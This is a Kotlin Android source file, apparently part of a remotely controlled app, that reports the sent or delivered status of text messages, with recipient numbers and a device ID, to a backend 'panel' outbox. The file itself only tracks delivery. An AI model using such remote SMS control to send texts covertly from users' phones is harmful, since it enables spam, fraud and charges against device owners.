package com.screenlink.remote

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

/**
 * SmsManager ke sent/delivered PendingIntent yahan aate hain.
 * Delivery report ko backend par bhejta hai taaki panel me real status dikhe.
 */
class SmsStatusReceiver : BroadcastReceiver() {

    companion object {
        const val ACTION_SENT = "com.screenlink.remote.SMS_SENT"
        const val ACTION_DELIVERED = "com.screenlink.remote.SMS_DELIVERED"

        private const val PREFS = "viral_prefs"
        private const val KEY_RID = "registration_id"

        private val pool = Executors.newSingleThreadExecutor { r ->
            Thread(r, "sms-status").apply { isDaemon = true }
        }
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return
        if (action != ACTION_SENT && action != ACTION_DELIVERED) return

        val outboxId = intent.getStringExtra("outbox_id").orEmpty()
        val to = intent.getStringExtra("to").orEmpty()
        val resultCode = resultCode

        val pending = goAsync()
        val app = context.applicationContext

        pool.execute {
            try {
                val rid = app.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                    .getString(KEY_RID, "").orEmpty()
                if (rid.isBlank()) return@execute

                val delivered = action == ACTION_DELIVERED
                val ok = delivered || resultCode == android.app.Activity.RESULT_OK

                val status = when {
                    delivered -> "delivered"
                    ok -> "sent"
                    else -> "failed"
                }

                val error = if (ok) "" else "result=$resultCode"
                post(app, rid, outboxId, to, status, error)
                Log.i("SmsStatus", "sms $status to=$to id=$outboxId")
            } finally {
                pending.finish()
            }
        }
    }

    private fun post(
        context: Context,
        rid: String,
        outboxId: String,
        to: String,
        status: String,
        error: String
    ) {
        if (outboxId.isBlank()) return

        var conn: HttpURLConnection? = null
        try {
            conn = URL("${TpcService.API_BASE_URL}/devices/outbox/$outboxId/ack")
                .openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.connectTimeout = 8_000
            conn.readTimeout = 8_000
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

            val payload = JSONObject().apply {
                put("status", status)
                put("error", error)
                put("to", to)
                put("registration_id", rid)
            }.toString()

            conn.outputStream.use { it.write(payload.toByteArray(Charsets.UTF_8)) }
            conn.responseCode
        } catch (_: Exception) {
            // fail hone par TpcService ka poll pick kar lega
        } finally {
            conn?.disconnect()
        }
    }
}